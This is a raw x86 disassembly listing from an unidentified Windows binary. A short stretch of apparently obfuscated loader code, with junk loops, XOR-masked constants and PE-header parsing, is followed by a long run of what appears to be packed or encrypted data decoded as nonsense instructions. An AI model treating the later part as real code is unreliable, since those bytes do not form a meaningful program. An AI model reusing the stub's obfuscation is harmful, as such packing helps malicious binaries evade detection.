  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	push   esp
  402ab5:	cmp    edi,DWORD PTR ss:[eax+0x7c]
  402ab9:	jl     0x402b37
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	sbb    al,0x64
  402ace:	ins    BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x351c44f2]
  402b65:	sbb    eax,0x292b85ed
  402b6a:	in     al,dx
  402b6b:	sub    al,0x25
  402b6d:	dec    DWORD PTR [esi]
  402b6f:	sub    eax,0xaf461ec8
  402b74:	push   ecx
  402b75:	mov    eax,ds:0xe021474d
  402b7a:	adc    esi,DWORD PTR [esi-0x57]
  402b7d:	test   al,0x29
  402b7f:	jae    0x402b52
  402b81:	pop    ebx
  402b82:	sub    eax,0xd902ee91
  402b87:	pop    ds
  402b88:	aam    0xc6
  402b8a:	mov    al,BYTE PTR [eax]
  402b8c:	sbb    bh,BYTE PTR [eax+0x1157802a]
  402b92:	mov    bh,0x65
  402b94:	push   ebp
  402b95:	ds (bad) 
  402b97:	inc    edx
  402b98:	sub    bl,0xf5
  402b9b:	cmp    edi,DWORD PTR [eax]
  402b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b9e:	push   edx
  402b9f:	mov    esi,0x5f1434be
  402ba4:	popf   
  402ba5:	je     0x402bcc
  402ba7:	stc    
  402ba8:	(bad)  
  402bac:	xchg   bl,ch
  402bae:	test   DWORD PTR [eax+edi*1+0x19],eax
  402bb2:	arpl   WORD PTR [edx],bp
  402bb4:	push   es
  402bb5:	fcomp  QWORD PTR [ebx-0x23]
  402bb8:	fxch   st(5)
  402bba:	pusha  
  402bbb:	cli    
  402bbc:	xor    bl,dl
  402bbe:	mov    eax,ds:0x8e346bef
  402bc3:	push   0xb51dec4a
  402bc8:	dec    ecx
  402bc9:	int3   
  402bca:	cld    
  402bcb:	mov    gs,WORD PTR [ebp-0x45be612c]
  402bd1:	xchg   edi,eax
  402bd2:	xor    edi,DWORD PTR [ecx]
  402bd4:	cmp    edi,DWORD PTR [eax-0x752c86bd]
  402bda:	dec    DWORD PTR [di+0x33]
  402bde:	xor    cl,BYTE PTR [edi]
  402be0:	jns    0x402c1c
  402be2:	cmp    ebx,DWORD PTR [eax-0x75e1260f]
  402be8:	xor    BYTE PTR [ecx],bh
  402bea:	mov    edx,0x5c109c79
  402bef:	push   ebp
  402bf0:	mov    bh,0xaf
  402bf2:	aam    0x36
  402bf4:	jecxz  0x402c00
  402bf6:	jmp    0xf6c8561c
  402bfb:	shl    DWORD PTR [esp+edx*4-0x7e],0x47
  402c00:	adc    eax,0x13d7befb
  402c05:	sub    ch,bh
  402c07:	retf   0xef74
  402c0a:	add    esi,DWORD PTR [eax+0x20]
  402c0d:	(bad)  
  402c0f:	inc    edx
  402c10:	add    al,0xfe
  402c12:	pop    edi
  402c13:	mov    ecx,0xc01aacf7
  402c18:	imul   ebx,DWORD PTR [edi+0x65],0xef727b1c
  402c1f:	or     ch,BYTE PTR gs:0x47120f74
  402c26:	test   eax,0xedff0ec2
  402c2b:	add    al,0x44
  402c2d:	jp     0x402c34
  402c2f:	adc    cl,BYTE PTR [ecx-0x38]
  402c32:	mov    ds:0xd44f6a9f,eax
  402c37:	sbb    ah,BYTE PTR [edi]
  402c39:	and    BYTE PTR [ecx],ah
  402c3b:	mov    esp,edi
  402c3d:	scas   eax,DWORD PTR es:[edi]
  402c3e:	jle    0x402c46
  402c40:	(bad)  
  402c41:	xor    eax,0xbbb6a4d9
  402c46:	cmp    DWORD PTR [edx-0x49e7f3f7],0x59
  402c4d:	in     eax,dx
  402c4e:	mov    bh,BYTE PTR [ecx-0x60340142]
  402c54:	js     0x402c48
  402c56:	(bad)  
  402c57:	out    dx,al
  402c58:	jbe    0x402bfe
  402c5a:	sahf   
  402c5b:	sbb    al,0xf9
  402c5d:	sub    DWORD PTR [esi-0x352d139f],edx
  402c63:	std    
  402c64:	ja     0x402c50
  402c66:	push   cs
  402c67:	or     eax,0xac0095ac
  402c6c:	in     al,dx
  402c6d:	cmp    BYTE PTR [eax-0x5a8f67d5],dl
  402c73:	mov    dh,0xcc
  402c75:	or     ebp,edi
  402c77:	fist   WORD PTR [edx]
  402c79:	repz js 0x402caf
  402c7c:	out    0xf,al
  402c7e:	xlat   BYTE PTR ds:[ebx]
  402c7f:	out    dx,eax
  402c80:	ins    BYTE PTR es:[edi],dx
  402c81:	jns    0x402c64
  402c83:	and    al,0x55
  402c85:	lock iret 
  402c87:	push   esp
  402c88:	sbb    BYTE PTR [eax],ch
  402c8a:	sahf   
  402c8b:	hlt    
  402c8c:	cld    
  402c8d:	mov    bh,BYTE PTR [edi]
  402c8f:	sub    dl,cl
  402c91:	sbb    BYTE PTR [ebx+0x243cccd3],dh
  402c97:	dec    esi
  402c98:	and    eax,0x36bd76b3
  402c9d:	push   esi
  402c9e:	aas    
  402c9f:	dec    ecx
  402ca0:	ds mov ecx,0xaab00c8e
  402ca6:	cli    
  402ca7:	add    ebx,DWORD PTR [ecx]
  402ca9:	mov    ds:0xbd20234d,eax
  402cae:	into   
  402caf:	mov    ch,0x7
  402cb1:	xchg   edi,eax
  402cb2:	pop    esp
  402cb3:	lahf   
  402cb4:	pop    eax
  402cb5:	mov    dl,0xbe
  402cb7:	out    0xdd,eax
  402cb9:	mov    WORD PTR [eax+edi*1],cs
  402cbc:	cmp    DWORD PTR [ebx-0x990a9cb],esi
  402cc2:	or     esp,edi
  402cc4:	repnz dec ecx
  402cc6:	or     eax,0x4e4b7bb7
  402ccb:	xor    eax,0xa2356791
  402cd0:	mov    ebx,0x869311d3
  402cd5:	cmp    DWORD PTR ds:[edi+eax*8+0x2a],esp
  402cda:	dec    ecx
  402cdb:	addr16 in eax,0x61
  402cde:	gs xchg esi,eax
  402ce0:	jp     0x402c97
  402ce2:	fdiv   QWORD PTR [ecx-0x42]
  402ce5:	iret   
  402ce6:	aaa    
  402ce7:	in     al,0xe2
  402ce9:	dec    esi
  402cea:	adc    al,0xe6
  402cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ced:	stc    
  402cee:	ins    DWORD PTR es:[edi],dx
  402cef:	add    bl,BYTE PTR [ebx-0x22]
  402cf2:	test   eax,0x2b85593d
  402cf7:	push   ecx
  402cf8:	sbb    ecx,DWORD PTR ds:0x48d207d4
  402cfe:	and    eax,DWORD PTR [edx]
  402d00:	sbb    DWORD PTR [ebp+0x5df3b7c5],edx
  402d06:	inc    ebp
  402d07:	pop    ds
  402d08:	push   0x98723217
  402d0d:	ins    DWORD PTR es:[edi],dx
  402d0e:	scas   eax,DWORD PTR es:[edi]
  402d0f:	jmp    0xd96e:0x1e51a125
  402d16:	mov    edx,0x44cabf5c
  402d1b:	mov    cl,0xf4
  402d1d:	ret    
  402d1e:	sar    BYTE PTR [edx+0x29],cl
  402d21:	(bad)  
  402d22:	repz xchg ecx,eax
  402d24:	stos   BYTE PTR es:[edi],al
  402d25:	cmp    eax,0x1953a444
  402d2a:	jnp    0x402d1a
  402d2c:	inc    ebx
  402d2d:	rcl    BYTE PTR ss:[bx+si],cl
  402d31:	push   0x6dbdd42
  402d36:	or     dl,BYTE PTR [ebp-0x4b4dfb10]
  402d3c:	aas    
  402d3d:	(bad)  
  402d3e:	call   DWORD PTR [ecx+eax*2-0x5b9b609a]
  402d45:	mov    ecx,ss
  402d47:	test   dh,dl
  402d49:	mov    DWORD PTR [ecx+ecx*8],esi
  402d4c:	aas    
  402d4d:	mov    ch,0xb3
  402d4f:	clc    
  402d50:	adc    ecx,DWORD PTR [esp+edi*4-0x75]
  402d54:	stc    
  402d55:	push   0xfffffff7
  402d57:	adc    eax,0xea17e74a
  402d5c:	aad    0xd3
  402d5e:	push   esi
  402d5f:	(bad)  
  402d60:	not    BYTE PTR [edi]
  402d62:	call   ecx
  402d64:	or     dl,dh
  402d66:	test   ch,al
  402d68:	pushfw 
  402d6a:	push   edx
  402d6b:	mov    eax,ds:0x37dc8fa
  402d70:	mov    al,fs:0x439666e8
  402d76:	ret    0x7453
  402d79:	xchg   DWORD PTR [edx-0x38],ebp
  402d7c:	push   esp
  402d7d:	inc    edx
  402d7e:	dec    eax
  402d7f:	inc    eax
  402d80:	mov    gs,WORD PTR [ecx]
  402d82:	lods   eax,DWORD PTR ds:[esi]
  402d83:	adc    eax,0xffacf33d
  402d88:	pop    ss
  402d89:	lods   eax,DWORD PTR ds:[esi]
  402d8a:	adc    al,0x9
  402d8c:	jecxz  0x402dab
  402d8e:	popa   
  402d8f:	cvtdq2ps xmm6,XMMWORD PTR ds:0x6b13663e
  402d96:	(bad)  
  402d97:	push   ebx
  402d98:	mov    ?,WORD PTR [edi]
  402d9a:	arpl   WORD PTR [edi+0x640f20c0],si
  402da0:	push   ebp
  402da1:	(bad)  
  402da2:	sub    al,0x64
  402da4:	out    dx,al
  402da5:	sahf   
  402da6:	dec    edx
  402da7:	xor    edi,ebp
  402da9:	lods   eax,DWORD PTR ds:[esi]
  402daa:	fist   DWORD PTR [esi+0x33]
  402dad:	sub    al,0xad
  402daf:	mov    cs,WORD PTR [ebp+0x623a6a8]
  402db5:	jmp    FWORD PTR [eax+edx*8]
  402db8:	and    al,bl
  402dba:	add    BYTE PTR [edx+0x530466e5],cl
  402dc0:	push   es
  402dc1:	ret    
  402dc2:	jmp    DWORD PTR [edi-0x1c304d27]
  402dc8:	ret    
  402dc9:	push   ebp
  402dca:	clc    
  402dcb:	icebp  
  402dcc:	jns    0x402e47
  402dce:	xor    al,0xd
  402dd0:	outs   dx,DWORD PTR ds:[esi]
  402dd1:	in     al,dx
  402dd2:	enter  0x4ee6,0x22
  402dd6:	mov    esp,0x96294f9e
  402ddb:	jmp    0xc2420df9
  402de0:	cmp    al,0x72
  402de2:	ins    BYTE PTR es:[edi],dx
  402de3:	loopne 0x402e5d
  402de5:	cwde   
  402de6:	ret    0x3878
  402de9:	ret    0x4493
  402dec:	or     al,0xe
  402dee:	mov    eax,DWORD PTR [ebx]
  402df0:	jg     0x402e26
  402df2:	aaa    
  402df3:	xchg   esi,eax
  402df4:	jecxz  0x402df2
  402df6:	ja     0x402e6b
  402df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402df9:	mov    bh,0x39
  402dfb:	ja     0x402dda
  402dfd:	pop    ecx
  402dfe:	sbb    DWORD PTR [ebx-0xc253967],edx
  402e04:	sub    DWORD PTR [edi],esp
  402e06:	loop   0x402e76
  402e08:	inc    ecx
  402e09:	sub    bl,BYTE PTR [ebx-0xd3b243a]
  402e0f:	call   0x1f31:0xfcbf9c90
  402e16:	adc    eax,0x28f84442
  402e1b:	mov    ds:0x80b901ce,al
  402e20:	in     eax,0xd5
  402e22:	aas    
  402e23:	shl    DWORD PTR [esi],cl
  402e25:	in     eax,0xee
  402e27:	dec    edi
  402e28:	adc    esp,ebp
  402e2a:	xchg   ecx,eax
  402e2b:	pcmpeqw mm5,QWORD PTR [ecx+0x2c]
  402e2f:	clc    
  402e30:	jns    0x402eb0
  402e32:	out    0x99,al
  402e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e35:	mov    edi,DWORD PTR [edx+0x7c]
  402e38:	and    BYTE PTR es:[ebx+0x5a],cl
  402e3c:	xor    al,0xea
  402e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3f:	jmp    0x69179097
  402e44:	jb     0x402e68
  402e46:	dec    ebx
  402e47:	mov    al,BYTE PTR [ebx-0x793240b9]
  402e4d:	sub    bh,BYTE PTR ds:0x8e86b065
  402e53:	mov    ebp,0x2090acd0
  402e58:	sbb    DWORD PTR [eax+0x64],ebp
  402e5b:	mov    ds:0x49daf768,al
  402e60:	jae    0x402de7
  402e62:	jmp    0xb000:0x3cd4e7f1
  402e69:	mov    esi,DWORD PTR [edx]
  402e6b:	fmul   DWORD PTR [edi-0x7256f984]
  402e71:	dec    edi
  402e72:	(bad)  
  402e73:	scas   ax,WORD PTR es:[edi]
  402e75:	jle    0x402e07
  402e77:	adc    BYTE PTR [ebx+0x71ec4c40],al
  402e7d:	ins    DWORD PTR es:[edi],dx
  402e7e:	not    DWORD PTR [ebx+0x7c]
  402e81:	scas   al,BYTE PTR es:[edi]
  402e82:	(bad)  
  402e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e84:	xchg   edi,eax
  402e85:	cmp    BYTE PTR [esi-0x38],cl
  402e88:	ss push edx
  402e8a:	fadd   QWORD PTR [edx+0x5a]
  402e8d:	and    DWORD PTR [ecx],edi
  402e8f:	clc    
  402e90:	xor    bh,al
  402e92:	xor    DWORD PTR [ebp+0x66],edx
  402e95:	add    BYTE PTR [esi+0x59254b2a],ah
  402e9b:	mov    al,ds:0x66a09cd3
  402ea0:	xchg   ecx,eax
  402ea1:	pop    esp
  402ea2:	arpl   WORD PTR [ecx],ax
  402ea4:	push   cs
  402ea5:	int3   
  402ea6:	out    0x10,eax
  402ea8:	rcl    DWORD PTR [ebx],cl
  402eaa:	adc    edx,DWORD PTR [esi-0x2c802559]
  402eb0:	mov    bl,0xb
  402eb2:	dec    eax
  402eb3:	jecxz  0x402e71
  402eb5:	xchg   ebp,eax
  402eb6:	adc    DWORD PTR [eax+esi*4],ebp
  402eb9:	sub    eax,0xb1b0b3a8
  402ebe:	cmp    DWORD PTR [ebp-0xd7fe887],ecx
  402ec4:	push   ebx
  402ec5:	sbb    dh,BYTE PTR [ecx-0x2d85ae16]
  402ecb:	fistp  WORD PTR [esi-0x9457f76]
  402ed1:	jmp    0xaf8e:0x44ba7a43
  402ed8:	jb     0x402ede
  402eda:	shr    dh,1
  402edc:	cli    
  402edd:	comiss xmm5,DWORD PTR [edi+0x680fe926]
  402ee4:	test   eax,0xfd073f22
  402ee9:	xchg   ebx,eax
  402eea:	and    dh,BYTE PTR [ebx]
  402eec:	xor    dl,BYTE PTR ds:0x28ff2bc1
  402ef2:	cmp    cl,ah
  402ef4:	jno    0x402f4c
  402ef6:	sub    eax,0xf529c6a6
  402efb:	inc    eax
  402efc:	scas   al,BYTE PTR es:[edi]
  402efd:	pop    edi
  402efe:	rol    BYTE PTR cs:[ecx-0x767d31d2],1
  402f05:	add    eax,0xa0d21485
  402f0a:	lods   al,BYTE PTR ds:[esi]
  402f0b:	add    cl,al
  402f0d:	mov    dh,0xa6
  402f0f:	jle    0x402ec2
  402f11:	sar    ebx,0x81
  402f14:	das    
  402f15:	mov    ds:0xb575831c,eax
  402f1a:	icebp  
  402f1b:	xchg   ebp,eax
  402f1c:	ss out 0x8a,al
  402f1f:	dec    ebx
  402f20:	mov    dl,0x39
  402f22:	sub    BYTE PTR ds:0x23d498c4,cl
  402f28:	leave  
  402f29:	ins    BYTE PTR es:[edi],dx
  402f2a:	std    
  402f2b:	cmp    eax,0x22a9b673
  402f30:	repnz arpl WORD PTR [esi+0x36],dx
  402f34:	ja     0x402ef6
  402f36:	mov    cl,0xf8
  402f38:	dec    esi
  402f39:	push   edi
  402f3a:	sub    al,0x9d
  402f3c:	pop    ebx
  402f3d:	stos   DWORD PTR es:[edi],eax
  402f3e:	adc    DWORD PTR [ecx+0x5672b5b0],ebp
  402f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f45:	jbe    0x402f90
  402f47:	cwde   
  402f48:	nop
  402f49:	call   0x8a7c:0xb732a4c2
  402f50:	loop   0x402f2e
  402f52:	mov    ah,0x27
  402f54:	fsubr  DWORD PTR [edi+0x6f]
  402f57:	mov    cl,0xa5
  402f59:	jge    0x402f97
  402f5b:	jne    0x402f25
  402f5d:	push   cs
  402f5e:	xor    BYTE PTR [edi],bl
  402f60:	mov    bl,ch
  402f62:	int3   
  402f63:	ja     0x402f15
  402f65:	stos   BYTE PTR es:[edi],al
  402f66:	fld    TBYTE PTR [edx+0x2fd2e8d4]
  402f6c:	fcmovnb st,st(4)
  402f6e:	aad    0xb0
  402f70:	shr    BYTE PTR [esi-0x5b25d7bf],0xe8
  402f77:	in     al,dx
  402f78:	and    eax,0xefb2a1f7
  402f7d:	dec    ebx
  402f7e:	vpunpckhbw xmm4,xmm5,XMMWORD PTR [edx-0x78]
  402f83:	es push edx
  402f85:	(bad)  
  402f86:	outs   dx,BYTE PTR ds:[esi]
  402f87:	pop    ebx
  402f88:	iret   
  402f89:	iret   
  402f8a:	and    bh,BYTE PTR [esi-0x4da425ae]
  402f90:	out    0xef,al
  402f92:	mov    eax,ds:0xe7c8bded
  402f97:	in     al,0x0
  402f99:	push   0xe6703c89
  402f9e:	sub    al,BYTE PTR [eax]
  402fa0:	aam    0xeb
  402fa2:	or     dl,dl
  402fa4:	add    eax,0xca48922f
  402fa9:	pusha  
  402faa:	fcom   QWORD PTR [edx]
  402fac:	push   0x6c
  402fae:	xchg   ebp,eax
  402faf:	push   0xc4bb3965
  402fb4:	(bad)  
  402fb5:	outs   dx,BYTE PTR ds:[esi]
  402fb6:	sub    al,0x43
  402fb8:	pop    ecx
  402fb9:	data16 xor BYTE PTR [eax],cl
  402fbc:	xchg   ecx,eax
  402fbd:	stos   DWORD PTR es:[edi],eax
  402fbe:	ins    DWORD PTR es:[edi],dx
  402fbf:	shl    BYTE PTR [edi-0x22],cl
  402fc2:	cli    
  402fc3:	jnp    0x402f72
  402fc5:	mov    ebp,0xdf9c213c
  402fca:	push   edi
  402fcb:	(bad)  
  402fcc:	inc    edi
  402fcd:	lea    edi,[ebx]
  402fcf:	lods   al,BYTE PTR ds:[esi]
  402fd0:	jg     0x403030
  402fd2:	lock pause 
  402fd5:	mov    esi,DWORD PTR [esi]
  402fd7:	and    ch,BYTE PTR [edx+0x35]
  402fda:	pop    esp
  402fdb:	jnp    0x402fb0
  402fdd:	out    0xc8,al
  402fdf:	fs stc 
  402fe1:	clc    
  402fe2:	mov    eax,0xaae56ab2
  402fe7:	cli    
  402fe8:	cli    
  402fe9:	xor    al,0x47
  402feb:	es add al,0xb0
  402fee:	enter  0x50f0,0x64
  402ff2:	out    dx,eax
  402ff3:	pop    ebp
  402ff4:	ds call 0xe38:0xbc85cda9
  402ffc:	sub    DWORD PTR [ecx-0x11936b8b],esp
  403002:	cmp    ebp,DWORD PTR [ebx]
  403004:	mov    DWORD PTR [edx+0x770887ce],edi
  40300a:	pop    edx
  40300b:	and    DWORD PTR [ebx+ebp*1+0x9],edx
  40300f:	ret    
  403010:	dec    ebp
  403011:	fucomp st(6)
  403013:	xchg   esp,ebx
  403015:	daa    
  403016:	sbb    al,bh
  403018:	push   cs
  403019:	mov    edi,0x244458f6
  40301e:	pop    ebx
  40301f:	mov    edx,0xf99db321
  403024:	jae    0x40304b
  403026:	fnstenv [ecx+0xa]
  403029:	xchg   ebp,eax
  40302a:	idiv   BYTE PTR ds:0xc9951d85
  403030:	xchg   ah,al
  403032:	inc    eax
  403033:	call   0xde447c48
  403038:	popf   
  403039:	out    dx,al
  40303a:	mov    ss,WORD PTR [edi+0x38]
  40303d:	cld    
  40303e:	pop    ds
  40303f:	fcomp  QWORD PTR [ebx+0x23dc6ec4]
  403045:	(bad)  
  403046:	jg     0x40300e
  403048:	push   edx
  403049:	repnz repnz aaa 
  40304c:	popf   
  40304d:	daa    
  40304e:	fidiv  WORD PTR [ebp-0xc]
  403051:	adc    ch,bl
  403053:	jne    0x403080
  403055:	(bad)  
  403056:	xchg   ecx,eax
  403057:	clc    
  403058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403059:	(bad)
  40305c:	push   0xba8f95cb
  403061:	pop    es
  403062:	add    ecx,0x48cda35c
  403068:	repz cmp BYTE PTR [esi],bh
  40306b:	aad    0x6b
  40306d:	out    dx,eax
  40306e:	pop    ebx
  40306f:	(bad)  
  403070:	mov    esi,0x69355e7b
  403075:	adc    DWORD PTR [ecx+ebp*4+0x68],ebp
  403079:	pop    ds
  40307a:	jb     0x403097
  40307c:	(bad)  
  40307d:	sbb    BYTE PTR ds:0x52b9296b,al
  403083:	and    al,0xb4
  403085:	adc    eax,0x7bce9067
  40308a:	and    eax,0x74831f0f
  40308f:	jp     0x40307a
  403091:	mov    bh,0xc8
  403093:	xor    edx,DWORD PTR [edi]
  403095:	std    
  403096:	xchg   ecx,eax
  403097:	int    0x3c
  403099:	mov    ecx,0x6a915112
  40309e:	icebp  
  40309f:	ds pusha 
  4030a1:	inc    ebp
  4030a2:	or     eax,0x56dfda64
  4030a7:	jnp    0x4030c2
  4030a9:	cmp    eax,0x81384ed8
  4030ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030af:	jge    0x403045
  4030b1:	cmp    al,0xde
  4030b3:	lea    edx,[ebp+0x33]
  4030b6:	out    dx,al
  4030b7:	inc    edi
  4030b8:	rol    DWORD PTR [edi],0xbe
  4030bb:	xchg   DWORD PTR [esi],edi
  4030bd:	dec    esi
  4030be:	xlat   BYTE PTR ds:[ebx]
  4030bf:	mov    BYTE PTR [ebp+0x162ce0e4],0x20
  4030c6:	sahf   
  4030c7:	xor    ebx,DWORD PTR [ebx+0x3bc597a6]
  4030cd:	inc    ebx
  4030ce:	sbb    BYTE PTR [esp+esi*8],ah
  4030d1:	mov    ecx,0xd1c634c5
  4030d6:	mov    WORD PTR [ebx-0x9],ss
  4030d9:	(bad)  
  4030db:	mov    ch,0x72
  4030dd:	mov    cl,0x90
  4030df:	mov    dl,0xbe
  4030e1:	adc    eax,0xf7b76540
  4030e6:	push   0x8db1377
  4030eb:	sti    
  4030ec:	mov    bh,0xe9
  4030ee:	lds    esp,FWORD PTR [ebp+0x7a39e40f]
  4030f4:	sub    BYTE PTR [edx-0x79],bl
  4030f7:	lods   eax,DWORD PTR ds:[esi]
  4030f8:	fdiv   DWORD PTR [ebp+ecx*2+0x1be63291]
  4030ff:	(bad)  
  403100:	pop    esi
  403101:	daa    
  403102:	pop    edi
  403103:	fstp   TBYTE PTR [edx-0x65c1ce28]
  403109:	pop    ebp
  40310a:	aam    0xa3
  40310c:	dec    ebx
  40310d:	mov    bh,0x44
  40310f:	sahf   
  403110:	mov    bh,dl
  403112:	add    ecx,DWORD PTR [ebp-0x1349740f]
  403118:	pop    ss
  403119:	sbb    DWORD PTR [esi+0x16],ebx
  40311c:	push   esi
  40311d:	scas   eax,DWORD PTR es:[edi]
  40311e:	pop    es
  40311f:	push   0x36
